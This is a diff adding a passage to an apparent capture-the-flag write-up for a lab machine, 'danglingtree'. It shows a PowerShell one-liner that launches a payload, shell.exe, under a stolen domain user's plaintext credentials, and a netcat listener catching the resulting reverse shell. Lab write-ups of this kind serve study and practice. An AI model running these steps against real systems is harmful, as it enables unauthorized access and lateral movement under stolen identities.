@@ -1726,3 +1726,33 @@ SMB         10.129.82.45    445    DC               [+] danglingtree.htb\jake.h:
 ╰─                                                                                                                      ─╯
 
 ```
+
+
+``` powershell
+
+C:\Users\noah.b\Desktop>powershell -c "$pass=ConvertTo-SecureString 'Password123!' -AsPlainText -Force;$cred=New-Object PSCredential('danglingtree\jake.h',$pass);Start-Process 'C:\Users\Public\shell.exe' -Credential $cred -NoNewWindow -WorkingDirectory 'C:\'"
+powershell -c "$pass=ConvertTo-SecureString 'Password123!' -AsPlainText -Force;$cred=New-Object PSCredential('danglingtree\jake.h',$pass);Start-Process 'C:\Users\Public\shell.exe' -Credential $cred -NoNewWindow -WorkingDirectory 'C:\'"
+
+C:\Users\noah.b\Desktop>
+
+```
+
+
+``` bash
+
+❯ sudo nc -lvnp 443
+[sudo] password for joel:
+listening on [any] 443 ...
+connect to [10.10.15.166] from (UNKNOWN) [10.129.82.45] 56180
+Microsoft Windows [Version 10.0.26100.33158]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+danglingtree\jake.h
+
+C:\>
+
+
+
+```
